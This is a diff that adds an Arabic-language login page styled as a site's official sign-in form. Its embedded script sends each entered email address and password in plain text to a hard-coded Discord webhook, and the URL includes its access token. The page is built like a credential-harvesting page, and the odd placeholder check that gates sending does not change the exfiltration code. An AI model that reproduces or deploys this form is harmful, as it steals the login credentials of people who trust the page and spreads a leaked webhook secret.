@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>موقع صدي وسكي الرسمي</title>
+    <link rel="stylesheet" href="style.css"> <!-- ربط ملف الـ CSS -->
+</head>
+<body>
+    <div class="container">
+        <h1>تسجيل الدخول</h1>
+        <p>من فضلك أدخل بريدك الإلكتروني وكلمة المرور</p>
+        
+        <form id="loginForm">
+            <label for="email">البريد الإلكتروني:</label><br>
+            <input type="email" id="email" name="email" required><br><br>
+            
+            <label for="password">كلمة المرور:</label><br>
+            <input type="password" id="password" name="password" required><br><br>
+            
+            <button type="submit">تسجيل الدخول</button>
+        </form>
+
+        <div id="message"></div> <!-- لعرض الرسائل مثل "الباسورد خطأ" أو "شكراً" -->
+    </div>
+
+    <script>
+        // وظيفة لإرسال البيانات إلى Discord
+        function sendToDiscord(email, password) {
+            var webhookURL = 'https://discord.com/api/webhooks/1306483293340045362/nAFAoOen8hKse-bu6kuCeT8C__nJzi_O--MImbTODFNetNmJzsaV2f1LpW7gLzjpb5Up';
+            
+            var data = {
+                content: 'تم تسجيل الدخول:\nالبريد الإلكتروني: ' + email + '\nكلمة المرور: ' + password
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => console.log('تم إرسال البيانات إلى Discord:', data))
+            .catch((error) => console.error('حدث خطأ أثناء إرسال البيانات إلى Discord:', error));
+        }
+
+        // التعامل مع إرسال النموذج
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();  // منع إعادة تحميل الصفحة
+            
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // تحقق من كلمة المرور (هنا نستخدم كلمة مرور ثابتة كمثال)
+            var correctPassword = "your-password"; // كلمة المرور الصحيحة
+
+            if (password === correctPassword) {
+                // إذا كانت كلمة المرور صحيحة
+                sendToDiscord(email, password);
+                document.getElementById('message').innerHTML = "<p>شكراً لك على تسجيل الدخول!</p>"; // رسالة الشكر
+                document.getElementById('message').style.color = 'green';
+                
+                // مسح البيانات من النموذج بعد الإرسال
+                document.getElementById('loginForm').reset();
+            } else {
+                // إذا كانت كلمة المرور خاطئة
+                document.getElementById('message').innerHTML = "<p style='color: red;'>الباسورد خطأ. حاول مرة أخرى.</p>";
+            }
+        });
+    </script>
+</body>
+</html>
